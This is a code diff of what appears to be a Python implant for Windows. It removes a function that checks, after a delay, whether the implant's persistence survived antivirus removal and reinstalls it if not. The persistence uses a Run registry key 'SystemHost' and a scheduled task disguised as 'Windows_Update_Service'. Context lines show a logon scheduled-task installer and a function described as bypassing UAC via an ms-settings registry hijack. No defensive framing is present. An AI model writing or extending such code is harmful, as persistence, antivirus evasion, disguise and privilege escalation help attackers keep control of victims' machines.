@@ -1,4 +1,4 @@
-import os, sys, shutil, subprocess, ctypes, time
+import os, sys, shutil, subprocess, ctypes
 try: import winreg
 except: winreg = None
 
@@ -39,40 +39,6 @@ def install_persistence(exe_path=None):
             # Fallback for WinError 1455
             os.system(f'schtasks /create /f /tn "{_tn}" /tr "\'{_cmd}\'" /sc onlogon /rl {"highest" if _is_a else "limited"} >nul 2>&1')
     except: pass
-
-def verify_persistence(exe_path=None, delay=30):
-    """Runs in background after install — verifies persistence survived AV and re-installs if not."""
-    import threading, time
-    def _verify():
-        time.sleep(delay)
-        try:
-            _target = os.path.join(os.environ.get("LOCALAPPDATA", ""), "MRL", "SystemHost.exe")
-            if not exe_path: _exe = _target
-            else: _exe = exe_path
-            _tn = "Windows_Update_Service"
-            _cmd = f'"{_exe}" --background'
-            # Check registry run key
-            reg_ok = False
-            if winreg:
-                try:
-                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
-                                        winreg.KEY_QUERY_VALUE)
-                    val, _ = winreg.QueryValueEx(key, "SystemHost")
-                    winreg.CloseKey(key)
-                    reg_ok = bool(val)
-                except: pass
-            # Check scheduled task
-            task_ok = False
-            try:
-                out = subprocess.check_output(["schtasks", "/query", "/tn", _tn], stderr=subprocess.DEVNULL)
-                task_ok = _tn.lower() in out.decode(errors="ignore").lower()
-            except: pass
-            # Re-install whatever is missing
-            if not reg_ok or not task_ok:
-                install_persistence(_exe)
-        except: pass
-    threading.Thread(target=_verify, daemon=True).start()
 
 def silent_elevate(exe_path):
     """Bypasses UAC via ms-settings registry hijack."""
